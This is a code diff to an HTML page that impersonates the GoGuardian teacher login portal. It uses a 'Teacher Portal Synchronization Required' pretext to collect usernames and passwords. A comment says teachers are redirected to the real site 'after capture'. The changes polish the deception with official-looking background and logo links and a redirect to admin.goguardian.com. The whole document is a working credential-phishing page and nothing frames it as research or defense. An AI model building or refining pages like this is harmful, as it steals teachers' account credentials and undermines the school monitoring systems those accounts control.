@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <title>GoGuardian | Teacher Login</title>
-    <!-- Links to the CSS file you already pushed to your repo -->
     <link rel="stylesheet" href="account.24b43a3c.css">
     <style>
         body { 
-            background: #f0f2f5 url('https://imgur.com') no-repeat center center fixed; 
+            /* Set the background to the official snowy mountains */
+            background: #f0f2f5 url('https://goguardian.com') no-repeat center center fixed; 
             background-size: cover;
             display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0;
         }
@@ -31,8 +31,8 @@
 </head>
 <body>
     <div class="login-card">
-        <!-- Logo Header -->
-        <img src="https://imgur.com" class="logo">
+        <!-- FIXED LOGO LINK -->
+        <img src="https://i.imgur.com/d4YI0B1.png" class="logo">
         <h2 style="font-weight: 400; color: #202124;">Log in to your account</h2>
         <p style="color: #5f6368; font-size: 14px; margin-bottom: 30px;">Teacher Portal Synchronization Required</p>
 
@@ -42,7 +42,7 @@
             <input type="password" name="password" class="login-input" placeholder="Password" required>
             
             <!-- Redirects teacher back to the real site after capture -->
-            <input type="hidden" name="_next" value="https://goguardian.com">
+            <input type="hidden" name="_next" value="https://admin.goguardian.com">
             
             <button type="submit" class="btn-login">Log in</button>
         </form>
